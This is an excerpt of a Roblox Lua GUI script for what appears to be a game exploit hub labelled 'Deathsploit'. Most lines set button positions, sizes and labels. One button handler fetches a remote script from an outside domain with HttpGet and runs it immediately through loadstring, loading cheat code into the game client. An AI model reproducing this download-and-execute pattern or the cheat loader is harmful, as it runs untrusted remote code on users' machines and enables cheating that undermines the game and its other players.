...
local Execute11_2 = Instance.new("TextButton")
...
Execute4.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://deathsploit.xyz/darkhub.lua',true))()
end)
...
Execute10.Position = UDim2.new(0.54900682, 0, 0.325672269, 0)
Execute10.Size = UDim2.new(0, 238, 0, 50)
Execute10.Font = Enum.Font.SourceSans
Execute10.Text = "Patched!"
...
Execute11.Position = UDim2.new(0.54900682, 0, 0.149390221, 0)
Execute11.Size = UDim2.new(0, 238, 0, 50)
Execute11.Font = Enum.Font.SourceSans
Execute11.Text = "Deathsploit 1.0 (Old)"
...
UICorner_13.Parent = Execute11_2
